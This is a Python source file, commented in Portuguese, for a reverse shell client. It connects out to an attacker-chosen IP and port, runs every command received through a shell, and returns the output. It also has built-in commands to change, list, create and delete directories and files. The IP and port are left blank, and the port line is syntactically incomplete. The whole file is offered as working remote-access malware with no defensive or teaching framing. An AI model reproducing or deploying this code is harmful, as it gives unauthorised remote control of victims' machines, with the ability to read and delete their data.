import socket
import subprocess
import os

endereco_ip = ''  # Endereço de ip da maquina que ira servir como servidor e que dara os comandos
porta =   # Porta que sera aberta para conexão
soquete_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Criação de um soquete TCP/IP
soquete_cliente.connect((endereco_ip, porta))  # Soquete se conectando ao endereço de ip e porta dados
while True:
    dados_recebidos = soquete_cliente.recv(1024)  # Recebendo os dados passados pelo servidor
    dados_decodificados = dados_recebidos.decode()  # Decodifica os dados passados pelo servidor
    if 'cd' in dados_decodificados:  # Criação do modulo de "navegação"
        separacao_elementos = dados_decodificados.split()  # Separa os elementos de uma string transformando em lista
        del separacao_elementos[0]  # Deleta o primeiro elemento da lista (cd)
        path = ' '.join(separacao_elementos)  # Concatena os elementos da lista, transforma em uma string unica, separando os antigos elementos por espaço
        try:  # Para tratamento de erro
            os.chdir(path)  # Pega o destino e troca a localização do shell
            output = os.getcwdb()  # Pega a localização atual do shell
            soquete_cliente.send(output)  # Envia os dados de onde está o shell, já criptografado devido ao os.getcwd(b)
        except OSError:  # Tratamento de erro caso o arquivo não seja encontrado
            output = str(f'Erro: O sistema não pode encontrar o arquivo "{path}"')
            soquete_cliente.send(output.encode())
    elif 'mkdir' in dados_decodificados:  # Criação do modulo de criação de arquivos
        separacao_elementos = dados_decodificados.split()  # Faz a separação dos elementos da string
        del separacao_elementos[0]  # Deleta o primeiro elemento da lista (mkdir)
        nome_diretorio = ' '.join(separacao_elementos)  # Concatena os elementos da lista em uma unica string
        try:  # Tratamento de erro
            os.mkdir(nome_diretorio)  # Cria o diretorio com base nas strings concatenadas
            output = str(f'Diretorio "{nome_diretorio}" criado com sucesso!')
            soquete_cliente.send(output.encode())  # Envia pro servidor a informação de que o diretorio foi criado
        except OSError:  # Caso já exista o diretorio, ou caso o nome seja invalido
            output = str('Erro: Nome do diretorio ou arquivo invalido!')
            soquete_cliente.send(output.encode())  # Envia pro servidor o erro
    elif 'dir' in dados_decodificados:  # Criado o modulo para listagem de diretorios, mais especificamente, o diretorio local
        path = os.getcwdb()  # Pega a informação de onde esta o diretorio
        output = os.listdir(path)  # Pega a informação dos elementos do diretorio (em forma de lista)
        elementos_diretorio_criptografado = os.fsencode(str(output))  # Codifica o os elementos do diretorios, que foram convertidos em string
        soquete_cliente.send(elementos_diretorio_criptografado)  # Envia pro servidor os elementos do diretorio
    elif 'remove' in dados_decodificados:  # Criado o modulo para remoção de arquivos
        separacao_elementos = dados_decodificados.split()  # Faz a separação por espaço da string
        del separacao_elementos[0]  # Deleta o comando remove da lista
        nome_diretorio_arquivo = ' '.join(separacao_elementos)  # Concatena os elementos da lista em uma string
        try:  # Tratamento de erro
            os.remove(nome_diretorio_arquivo)  # Remove o arquivo, com o nome listado no segundo elemento da string
            output = str(f'{nome_diretorio_arquivo} removido com sucesso!')  # Informa qual arquivo foi removido
            soquete_cliente.send(output.encode())  # Envia pro servidor a informação
        except FileNotFoundError:  # Caso o arquivo não seja encontrado
            output = str(f'Arquivo {nome_diretorio_arquivo} não encontrado!')
            soquete_cliente.send(output.encode())
        except PermissionError:  # Caso não tenha conseguido remover por erro de permissão
            output = str('Permissão negada')
            soquete_cliente.send(output.encode())
        except IsADirectoryError:  # Caso seja um diretorio
            try:  # Tratamento de erro
                os.rmdir(nome_diretorio_arquivo)  # Remoção de um diretorio com nome listado no segundo elemento da string
                output = str(f'{nome_diretorio_arquivo} removido com sucesso!')  # Informa qual diretorio foi removido
                soquete_cliente.send(output.encode())  # Envia a informação pro servidor
            except FileNotFoundError:  # Caso o arquivo não seja encontrado
                output = str(f'Arquivo {nome_diretorio_arquivo} não encontrado!')
                soquete_cliente.send(output.encode())
            except PermissionError:  # Caso não tenha conseguido remover por erro de permissão
                output = str(f'Permissão negada')
                soquete_cliente.send(output.encode())
    elif '/help' in dados_decodificados:
        output = '''cd {diretorio} - > Trocar o diretorio
mkdir {nome_do_diretorio} - > Cria um diretorio
dir - > Lista os itens presentes no diretorio local
remove {nome_diretorio_ou_arquivo} - > Remove um arquivo ou diretorio da atual pasta
/help - > Lista os comandos "especiais" '''
        soquete_cliente.send(output.encode())
    else:
        shell = subprocess.Popen(dados_decodificados, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
        # Passando os dados recebidos, com shell habilitado e com os parametros stdout e stderr associados com um Pipe
        # shell = terminal/prompt de comando;
        # stdout = Todas as mensagens de informação passadas por um processo em shell;
        # stderr = Todas as mensagens de erro passadas por um processo em shell;
        # stidin = Entrada de dados em um processo em shell;
        # Pipe = "Liga" O stidin do servidor com o stdout/stderr do cliente.
        output = shell.stdout.read()  # Fazendo a leitura da resposta do comando (como um todo).
        output_erro = shell.stderr.read()  # Fazendo a leitura da resposta de erro (se houver).
        soquete_cliente.send(output + output_erro)  # Enviando a resposta + possível erro de volta ao servidor.
